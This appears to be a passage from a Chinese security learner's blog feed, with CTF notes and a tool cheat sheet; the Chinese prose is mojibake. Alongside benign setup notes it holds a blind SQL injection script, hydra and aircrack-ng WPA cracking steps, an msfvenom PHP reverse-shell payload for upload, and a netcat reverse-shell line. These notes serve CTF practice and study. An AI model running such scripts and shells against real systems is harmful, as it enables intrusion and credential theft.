Thanks for your message Array, it has been received.</p>
</blockquote>
<p>é”™è¯¯çš„å‚æ•°è¯•æ¢å‡ºäº†md5å‡½æ•°ï¼Œç»“åˆé¢˜ç›®ç»™å‡ºçš„éšæ™¦æç¤ºï¼Œä»è€å¤–é‚£é‡Œçœ‹åˆ°çš„è¯´æ˜¯åŸå§‹å€¼å’ŒMD5å€¼ç›¸åŒï¼Œè€Œä¸”æ˜¯==è€Œä¸æ˜¯å¼ºç­‰äºã€‚</p>
<blockquote>
<p>php æ‰‹å†Œï¼šå¦‚æœè¯¥å­—ç¬¦ä¸²æ²¡æœ‰åŒ…å«â€™.â€™,â€™eâ€™,â€™Eâ€™å¹¶ä¸”å…¶æ•°å€¼å€¼åœ¨æ•´å½¢çš„èŒƒå›´ä¹‹å†…<br>
è¯¥å­—ç¬¦ä¸²è¢«å½“ä½œintæ¥å–å€¼ï¼Œå…¶ä»–æ‰€æœ‰æƒ…å†µä¸‹éƒ½è¢«ä½œä¸ºfloatæ¥å–å€¼ï¼Œè¯¥å­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å€¼å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å€¼ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> æŠ„dalaoçš„è„šæœ¬</span><br><span class="line"><span class="comment">#-*-encode:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateMD5</span><span class="params">()</span>:</span></span><br><span class="line">    pattern = <span class="string">"^0+e[0-9]+$"</span></span><br><span class="line">    <span class="comment"># è¢«è¯†åˆ«æˆè‹¥å¹²0å¼€å¤´åŠ ä¸Šeå¼€å¤´çš„å¼ºåˆ¶ç±»å‹è½¬æ¢åä¼šè¢«è§†ä¸ºç§‘å­¦è®¡æ•°æ³•ä¸­çš„0</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">1000000</span> ==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> i</span><br><span class="line">        s = <span class="string">'0e'</span>+str(i)</span><br><span class="line">        md5 = hashlib.md5(s).hexdigest()</span><br><span class="line">        flag = re.search(pattern,md5)</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            print(<span class="string">"source:"</span>,str(s))</span><br><span class="line">            print(<span class="string">"md5:"</span>,str(md5))</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    generateMD5()</span><br></pre></td></tr></table></figure>
<p>æœ€åå°†å¾—åˆ°çš„sourceå€¼ä¼ é€’è¿›nameå°±å¯ä»¥äº†</p>
<h2 id="ichunqiu-ç™¾åº¦æ¯getflag">ichunqiu ç™¾åº¦æ¯getflag</h2>
<p>çŸ¥è¯†ç‚¹ï¼šphpè‡ªå®šä¹‰å®šç•Œç¬¦<code>&lt;&lt;&lt;</code> ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&lt;&lt;&lt;a</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line">a</span><br></pre></td></tr></table></figure>
<p>ç›¸å½“äºæ˜¯<code>â€œflagâ€</code> ,æ³¨æ„æœ€åè¿˜æœ‰ä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œå°†è¿™éƒ¨åˆ†è¿›è¡Œurlç¼–ç åä¼ å…¥ã€‚è¯·æ±‚å¤´ä¹Ÿè¦è‡ªå·±é€ </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /Challenges/flag.php HTTP/1.1</span><br><span class="line">Host: xxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 44</span><br><span class="line"></span><br><span class="line">flag=%3c%3c%3c%61%0a%66%6c%61%67%0a%61%3b%0a</span><br></pre></td></tr></table></figure>
<p><img src="https://user-images.githubusercontent.com/40637063/57857218-3f22a600-7821-11e9-88a5-624bf3bb442f.png" alt="image"></p>
]]></content>
      <categories>
        <category>é¢˜å‹è®°å½•</category>
      </categories>
  </entry>
  <entry>
    <title>é›¶ç¢çŸ¥è¯†[working]</title>
    <url>/2019/08/28/%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h3 id="vscode">vscode</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æ˜¾ç¤ºå‡½æ•°åˆ—è¡¨ ctrl shift o</span><br><span class="line">å‰è¿›åé€€ alt å·¦å³</span><br></pre></td></tr></table></figure>
<h3 id="linux-Xdebug">linux Xdebug</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install php-pear # contains pecl</span><br><span class="line">apt install php-dev # contains phpsize which is need to run</span><br><span class="line">pecl install xdebug</span><br><span class="line"></span><br><span class="line">/etc/php/7.3/apache2/php.ini</span><br><span class="line"></span><br><span class="line">[xdebug]</span><br><span class="line">zend_extension=/usr/lib/php/20180731/xdebug.so</span><br><span class="line">xdebug.remote_enable = true</span><br><span class="line">xdebug.remote_autostart = true</span><br><span class="line">xdebug.remote_host = 192.168.75.1</span><br><span class="line">xdebug.remote_port = 9000</span><br><span class="line">xdebug.remote_log = /var/log/xdebug.log</span><br><span class="line">xdebug.max_nesting_level = 1000</span><br><span class="line"></span><br><span class="line">service apache2 restart</span><br><span class="line"></span><br><span class="line"># check phpinfo whether there is xdebug</span><br></pre></td></tr></table></figure>
<p>client-vscode</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctrl alt p   launch.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    // Use IntelliSense to learn about possible attributes.</span><br><span class="line">    // Hover to view descriptions of existing attributes.</span><br><span class="line">    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span><br><span class="line">    &quot;version&quot;: &quot;0.2.0&quot;,</span><br><span class="line">    &quot;configurations&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Listen for XDebug&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;php&quot;,</span><br><span class="line">            &quot;pathMappings&quot;: &#123;</span><br><span class="line">                &quot;/var/www/html/cms/tp6x&quot;: &quot;C:\\Users\\ch4ser__\\Desktop\\vscode_workspace\\tp6x&quot;,</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">            &quot;port&quot;: 9000,</span><br><span class="line">            &quot;log&quot;: true,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Launch currently open script&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;php&quot;,</span><br><span class="line">            &quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">            &quot;program&quot;: &quot;$&#123;file&#125;&quot;,</span><br><span class="line">            &quot;cwd&quot;: &quot;$&#123;fileDirname&#125;&quot;,</span><br><span class="line">            &quot;port&quot;: 9000</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="git">git</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git log flag.php #æŸ¥çœ‹æ–‡ä»¶çš„å†å²ç‰ˆæœ¬</span><br><span class="line">git diff &#123;ç‰ˆæœ¬å·&#125; #æŸ¥çœ‹å†å²ç‰ˆæœ¬å·çš„å†…å®¹å’Œç°åœ¨å†…å®¹çš„ä¸åŒ</span><br><span class="line">git reset --hard &#123;commit&#125;</span><br></pre></td></tr></table></figure>
<h3 id="find">find</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find / -user downfall 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<h3 id="mariadb-è¸©å‘">mariadb è¸©å‘</h3>
<p>è¿è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -uroot</span><br><span class="line">use mysql;</span><br><span class="line">select * from user where user=&apos;root&apos;;</span><br></pre></td></tr></table></figure>
<p>å°±ä¼šå‘ç°rootçš„pluginæ˜¯unix_socket,å…³äºè¿™ä¸ªæ’ä»¶çš„è§£é‡Šåœ¨è¿™é‡Œ</p>
<p><a href="https://mariadb.com/kb/en/library/authentication-plugin-unix-socket/" target="_blank" rel="noopener">https://mariadb.com/kb/en/library/authentication-plugin-unix-socket/</a></p>
<p>ç›´è§‚çš„æ•ˆæœæ˜¯:å½“åœ¨ç»ˆç«¯ä¸­mysql -uroot -hlocalhostçš„æ—¶å€™å¯ä»¥ç™»å½•,è€Œä¸”æ— éœ€éªŒè¯å¯†ç .ä½†æ˜¯phpåœ¨ä»¥rootèº«ä»½è¿æ¥æ•°æ®åº“çš„æ—¶å€™åªä¼šé­åˆ°æ‹’ç».</p>
<p>è§£å†³æ–¹æ³•:åˆ›å»ºä¸€ä¸ªæ–°çš„ç”¨æˆ·,æˆ–è€…ä¿®æ”¹å·²æœ‰ç”¨æˆ·çš„ç™»å½•æœºåˆ¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE USER &apos;newuser&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;password&apos;;</span><br><span class="line">ALTER USER newuser@localhost IDENTIFIED VIA mysql_native_password;</span><br><span class="line">GRANT ALL PRIVILEGES ON * . * TO &apos;newuser&apos;@&apos;localhost&apos;;</span><br></pre></td></tr></table></figure>
<h2 id="apache2-æœåŠ¡å‡ºç°é—®é¢˜">apache2 æœåŠ¡å‡ºç°é—®é¢˜</h2>
<p>ç²—æš´ä¸€äº›</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt purge apache2</span><br><span class="line">apt reinstall apache2</span><br></pre></td></tr></table></figure>
<h3 id="htaccess-å®éªŒ">.htaccess å®éªŒ</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a2enmod</span><br><span class="line">vim /etc/apache2/site-enabled/000-default.conf</span><br><span class="line">	&lt;Directory /var/www/&gt;</span><br><span class="line">		Options -Indexes</span><br><span class="line">		AllowOverride All</span><br><span class="line">	&lt;/Directory&gt;</span><br><span class="line">service apache2 restart</span><br></pre></td></tr></table></figure>
<h3 id="curl">curl</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl --local-port &#123;PORT&#125; &#123;url&#125; #ä»æœ¬åœ°çš„æŒ‡å®šç«¯å£å»è®¿é—®url</span><br><span class="line">curl -d "user=admin&amp;password=111" http://207.148.64.125:1111 #postæ•°æ®</span><br><span class="line">curl -H "Content-Type:application/json" -X POST -d '&#123;"user": "admin", "passwd":"12345678"&#125;' http://127.0.0.1:8000/login</span><br></pre></td></tr></table></figure>
<h3 id="docker">docker</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> this will create a container</span></span><br><span class="line">sudo docker run -it kalilinux/kali-linux-docker /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash"> after <span class="built_in">exit</span> it ,run container again</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> find out all the container</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -al will only show the active container</span></span><br><span class="line">sudo docker ps -a</span><br><span class="line">sudo docker container start &#123;container id&#125;</span><br><span class="line"></span><br><span class="line">docker ps</span><br><span class="line">sudo docker exec -it &#123;container id&#125; /bin/bash</span><br><span class="line"></span><br><span class="line">docker build -t ssrf-lab/basic . #æ„å»ºé•œåƒ</span><br><span class="line">docker run -d -p 8999:80 ssrf-lab/basic #åˆ›å»ºå®¹å™¨</span><br><span class="line">docker stop [å®¹å™¨ç¼–å·] #å…³é—­å®¹å™¨</span><br><span class="line"></span><br><span class="line">docker attach bianhao # è¿›å…¥å®¹å™¨</span><br></pre></td></tr></table></figure>
<h3 id="python-æ‰§è¡Œjsä»£ç ">python æ‰§è¡Œjsä»£ç </h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"></span><br><span class="line">jsFunc = <span class="string">'''</span></span><br><span class="line"><span class="string">function sign (data, key) &#123;</span></span><br><span class="line"><span class="string">    var privateKey</span></span><br><span class="line"><span class="string">    var i, j</span></span><br><span class="line"><span class="string">    var W = new Array(80)</span></span><br><span class="line"><span class="string">    var A, B, C, D, E</span></span><br><span class="line"><span class="string">    var H0 = 0x97B5D3F1</span></span><br><span class="line"><span class="string">    var H1 = 0x1F3D5B79</span></span><br><span class="line"><span class="string">    var H2 = 0x684A2C0E</span></span><br><span class="line"><span class="string">    var H3 = 0xE0C2A486</span></span><br><span class="line"><span class="string">    var H4 = 0x33221100</span></span><br><span class="line"><span class="string">    var H5 = 0xF0F0F0F0</span></span><br><span class="line"><span class="string">    var temp</span></span><br><span class="line"><span class="string">    var _RSA = function (n, s) &#123;</span></span><br><span class="line"><span class="string">        var t4 = (n &lt;&lt; s) | (n &gt;&gt;&gt; (32 - s))</span></span><br><span class="line"><span class="string">        return t4</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    var _Rot = function (val) &#123;</span></span><br><span class="line"><span class="string">        var str = ''</span></span><br><span class="line"><span class="string">        var i</span></span><br><span class="line"><span class="string">        var v</span></span><br><span class="line"><span class="string">        for (i = 7; i &gt;= 0; i--) &#123;</span></span><br><span class="line"><span class="string">            v = (val &gt;&gt;&gt; (i * 4)) &amp; 0x0f</span></span><br><span class="line"><span class="string">            str += v.toString(16)</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        return str</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    str = unescape(encodeURIComponent(key + data))</span></span><br><span class="line"><span class="string">    var strLen = str.length</span></span><br><span class="line"><span class="string">    var wordArray = []</span></span><br><span class="line"><span class="string">    for (i = 0; i &lt; strLen - 3; i += 4) &#123;</span></span><br><span class="line"><span class="string">        j = str.charCodeAt(i) &lt;&lt; 24 |</span></span><br><span class="line"><span class="string">            str.charCodeAt(i + 1) &lt;&lt; 16 |</span></span><br><span class="line"><span class="string">            str.charCodeAt(i + 2) &lt;&lt; 8 |</span></span><br><span class="line"><span class="string">            str.charCodeAt(i + 3)</span></span><br><span class="line"><span class="string">        wordArray.push(j)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    switch (strLen % 4) &#123;</span></span><br><span class="line"><span class="string">        case 0:</span></span><br><span class="line"><span class="string">            i = 0x080000000</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">        case 1:</span></span><br><span class="line"><span class="string">            i = str.charCodeAt(strLen - 1) &lt;&lt; 24 | 0x0800000</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">        case 2:</span></span><br><span class="line"><span class="string">            i = str.charCodeAt(strLen - 2) &lt;&lt; 24 | str.charCodeAt(strLen - 1) &lt;&lt; 16 | 0x08000</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">        case 3:</span></span><br><span class="line"><span class="string">            i = str.charCodeAt(strLen - 3) &lt;&lt; 24 |</span></span><br><span class="line"><span class="string">                str.charCodeAt(strLen - 2) &lt;&lt; 16 |</span></span><br><span class="line"><span class="string">                str.charCodeAt(strLen - 1) &lt;&lt;</span></span><br><span class="line"><span class="string">            8 | 0x80</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    wordArray.push(i)</span></span><br><span class="line"><span class="string">    while ((wordArray.length % 16) !== 14) &#123;</span></span><br><span class="line"><span class="string">        wordArray.push(0)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    wordArray.push(strLen &gt;&gt;&gt; 29)</span></span><br><span class="line"><span class="string">    wordArray.push((strLen &lt;&lt; 3) &amp; 0x0ffffffff)</span></span><br><span class="line"><span class="string">    H0 ^= H5</span></span><br><span class="line"><span class="string">    H1 ^= H5</span></span><br><span class="line"><span class="string">    H2 ^= H5</span></span><br><span class="line"><span class="string">    H3 ^= H5</span></span><br><span class="line"><span class="string">    H4 ^= H5</span></span><br><span class="line"><span class="string">    for (privateKey = 0; privateKey &lt; wordArray.length; privateKey += 16) &#123;</span></span><br><span class="line"><span class="string">        for (i = 0; i &lt; 16; i++) &#123;</span></span><br><span class="line"><span class="string">            W[i] = wordArray[privateKey + i]</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        for (i = 16; i &lt;= 79; i++) &#123;</span></span><br><span class="line"><span class="string">            W[i] = _RSA(W[i - 3] ^ W[i - 8] ^ W[i - 14] ^ W[i - 16], 1)</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        A = H0</span></span><br><span class="line"><span class="string">        B = H1</span></span><br><span class="line"><span class="string">        C = H2</span></span><br><span class="line"><span class="string">        D = H3</span></span><br><span class="line"><span class="string">        E = H4</span></span><br><span class="line"><span class="string">        for (i = 0; i &lt;= 19; i++) &#123;</span></span><br><span class="line"><span class="string">            temp = (_RSA(A, 5) + ((B &amp; C) | (~B &amp; D)) + 0x5A820000 + E + W[i] + 0x00007999) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">            E = D</span></span><br><span class="line"><span class="string">            D = C</span></span><br><span class="line"><span class="string">            C = _RSA(B, 30)</span></span><br><span class="line"><span class="string">            B = A</span></span><br><span class="line"><span class="string">            A = temp</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        for (i = 20; i &lt;= 39; i++) &#123;</span></span><br><span class="line"><span class="string">            temp = (_RSA(A, 5) + (B ^ C ^ D) + 0x6ED90000 + E + W[i] + 0x0000EBA1) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">            E = D</span></span><br><span class="line"><span class="string">            D = C</span></span><br><span class="line"><span class="string">            C = _RSA(B, 30)</span></span><br><span class="line"><span class="string">            B = A</span></span><br><span class="line"><span class="string">            A = temp</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        for (i = 40; i &lt;= 59; i++) &#123;</span></span><br><span class="line"><span class="string">            temp = (_RSA(A, 5) + ((B &amp; C) | (B &amp; D) | (C &amp; D)) + 0x8F1B0000 + E + W[i] + 0x0000BCDC) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">            E = D</span></span><br><span class="line"><span class="string">            D = C</span></span><br><span class="line"><span class="string">            C = _RSA(B, 30)</span></span><br><span class="line"><span class="string">            B = A</span></span><br><span class="line"><span class="string">            A = temp</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        for (i = 60; i &lt;= 79; i++) &#123;</span></span><br><span class="line"><span class="string">            temp = (_RSA(A, 5) + (B ^ C ^ D) + 0xCA620000 + E + W[i] + 0x0000C1D6) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">            E = D</span></span><br><span class="line"><span class="string">            D = C</span></span><br><span class="line"><span class="string">            C = _RSA(B, 30)</span></span><br><span class="line"><span class="string">            B = A</span></span><br><span class="line"><span class="string">            A = temp</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        H0 = (H0 + A) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">        H1 = (H1 + B) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">        H2 = (H2 + C) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">        H3 = (H3 + D) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">        H4 = (H4 + E) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    temp = _Rot(H0) + _Rot(H1) + _Rot(H2) + _Rot(H3) + _Rot(H4)</span></span><br><span class="line"><span class="string">    return temp.toLowerCase()</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">jsContext = execjs.compile(jsFunc)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://95cfb6e44c614a3e97563689926ccf1d420c63a73b184eed.changame.ichunqiu.com/login.php"</span></span><br><span class="line">string=<span class="string">'!@#$%^&amp;*aM0123456789qwertyuiopsdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBN'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">39</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        username = <span class="string">"%s' or ascii(mid(`p@ssw0rd`,%d,1))=%d#"</span> % (<span class="string">''</span>,n,ord(i)) </span><br><span class="line">        password = <span class="string">"111"</span></span><br><span class="line"></span><br><span class="line">        _nonce = jsContext.call(<span class="string">"sign"</span>,username + password, <span class="string">"YTY"</span> + <span class="string">"0Yj"</span> + <span class="string">"M0Y"</span> + <span class="string">"2Rh"</span> + <span class="string">"ZTZ"</span> + <span class="string">"iMj"</span> + <span class="string">"liZ"</span> + <span class="string">"jFj"</span> + <span class="string">"OTQ"</span> + <span class="string">"xOD"</span> + <span class="string">"=="</span>)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">                <span class="string">'username'</span>:username,</span><br><span class="line">                <span class="string">'password'</span>:password,</span><br><span class="line">                <span class="string">'submit'</span>:<span class="string">''</span>,</span><br><span class="line">                <span class="string">'_nonce'</span>:_nonce</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Incorrect'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            flag += i</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h3 id="vimæ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶çš„ä¸åŒä¹‹å¤„">vimæ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶çš„ä¸åŒä¹‹å¤„</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vimdiff -o bootstrap.js fakebootstrap.js</span><br></pre></td></tr></table></figure>
<p><img src="https://user-images.githubusercontent.com/40637063/59158832-170e2600-8af3-11e9-8238-9608a4f08714.png" alt="image"></p>
<h3 id="linuxä¸‹phpç‰ˆæœ¬åˆ‡æ¢">linuxä¸‹phpç‰ˆæœ¬åˆ‡æ¢</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --set php /usr/bin/php7.0</span><br></pre></td></tr></table></figure>
<h3 id="å¼±å£ä»¤çˆ†ç ´">å¼±å£ä»¤çˆ†ç ´</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l downfall -P /usr/share/wordlists/rockyou.txt -t 4</span><br><span class="line">cewl -w dc2_passwords.txt http://dc-2</span><br></pre></td></tr></table></figure>
<h3 id="aircrack">aircrack</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo airmon-ng start wlo1</span><br><span class="line">sudo airodump-ng wlo1mon</span><br><span class="line">sudo airodump-ng -w save_file -c 11 --bssid 02:1A:11:F1:A2:AB&#123;wifi_mac&#125; wlo1mon</span><br><span class="line"></span><br><span class="line">choose a active user</span><br><span class="line"></span><br><span class="line"> remain the terminal running above and start another.</span><br><span class="line"></span><br><span class="line">sudo aireplay-ng -0 100 -a 02:1A:11:F1:A2:AB&#123;wifi_mac&#125; -c &#123;client_mac&#125; wlo1mon</span><br><span class="line"></span><br><span class="line"> when there is WPA handshake show in the first terminal , continue.</span><br><span class="line">sudo aircrack-ng -w dict.txt -b &#123;wifi_mac&#125; save_file-01.cap</span><br><span class="line"></span><br><span class="line">airmon-ng stop wlan0mon</span><br></pre></td></tr></table></figure>
<h3 id="msf">msf</h3>
<p>php æ–‡ä»¶ä¸Šä¼ payloadç”Ÿæˆï¼š</p>
<p><code>sudo msfvenom -p php/meterpreter/reverse_tcp LHOST=172.20.10.12 LPORT=9991 -f raw &gt; shell.php</code></p>
<p>ç„¶åä¸Šä¼ shell.phpä¹‹åã€‚ã€‚ã€‚</p>
<p>ç›‘å¬å¹¶è®¿é—®ï¼š</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58418041-39e31800-80b9-11e9-8cd8-efc433d76bfd.png" alt="image"></p>
<h3 id="åˆ›å»ºpython-è™šæ‹Ÿç¯å¢ƒ">åˆ›å»ºpython è™šæ‹Ÿç¯å¢ƒ</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m venv myvenv</span><br><span class="line">source venv/bin/activate</span><br></pre></td></tr></table></figure>
<h3 id="python-ç¡¬é“¾æ¥">python ç¡¬é“¾æ¥</h3>
<p>ä»ä¸€é“å‡¯æ’’åŠ å¯†é¢˜ç›®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cacer = <span class="string">'ZNK WAOIQ HXUCT LUD PASVY UBKX ZNK RGFE JUM UL IGKYGX GTJ EUAX ATOWAK YURAZOUT OY UVRJGNLYKTKY'</span></span><br><span class="line"></span><br><span class="line">cacer = list(cacer)</span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">26</span>):</span><br><span class="line">    <span class="comment"># åŸæ¥å†™æ³•æ˜¯cacer_tmp = cacer,ä½†æ˜¯åæ¥è°ƒè¯•çš„æ—¶å€™å‘ç°cacer_tmpæ”¹å˜çš„æ—¶å€™caceråŒæ—¶å‘ç”Ÿäº†å˜åŒ–,äºŒè€…ä¹‹é—´äº§ç”Ÿäº†ç¡¬é“¾æ¥</span></span><br><span class="line">    cacer_tmp = [i <span class="keyword">for</span> i <span class="keyword">in</span> cacer]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cacer_tmp)):</span><br><span class="line">        <span class="keyword">if</span> cacer_tmp[i] != <span class="string">' '</span>:</span><br><span class="line">            cacer_tmp[i] = chr((ord(cacer_tmp[i]) - <span class="number">65</span> + offset)%<span class="number">26</span> + <span class="number">65</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">''</span>.join(cacer_tmp).lower()</span><br></pre></td></tr></table></figure>
<h3 id="pythonè°ƒç”¨å‘½ä»¤è¡Œ-getshell">pythonè°ƒç”¨å‘½ä»¤è¡Œ,getshell</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">md5 = os.popen(<span class="string">"python submd5.py "</span>+res_sub_md5+<span class="string">" 0"</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">"/bin/nc (url) -p 4444 -e /bin/bash"</span>)</span><br></pre></td></tr></table></figure>
<h3 id="è·å–cookie">è·å–cookie</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GuestCookie</span><span class="params">()</span>:</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    res = session.get(url)</span><br><span class="line">    <span class="keyword">return</span> session.cookies.get_dict()[<span class="string">'user'</span>]</span><br></pre></td></tr></table></figure>
<h3 id="è¿›åˆ¶è½¬æ¢">è¿›åˆ¶è½¬æ¢</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å­—ç¬¦ä¸²è½¬16è¿›åˆ¶</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">str=<span class="string">"content"</span></span><br><span class="line"><span class="keyword">print</span> binascii.b2a_hex(str.encode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ•°å­—è½¬10è¿›åˆ¶</span></span><br><span class="line"><span class="keyword">print</span> int(&#123;digest&#125;,&#123;shuzi_de_jinzhi&#125;)</span><br><span class="line"><span class="comment">#æ•°å­—è½¬16è¿›åˆ¶</span></span><br><span class="line"><span class="keyword">print</span> hex(&#123;digest&#125;,&#123;shuzi_de_jinzhi&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="decode">decode</h3>
<p>when we talk about â€˜hexâ€™ â€˜binaryâ€™ â€¦or other things about encode , we are talking about ascii.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57535861-98985a00-7375-11e9-8485-9e86d74e2e0d.png" alt="Screenshot from 2019-05-10 22-46-34"></p>
<h3 id="python3-çš„ç¼–ç é—®é¢˜">python3  çš„ç¼–ç é—®é¢˜</h3>
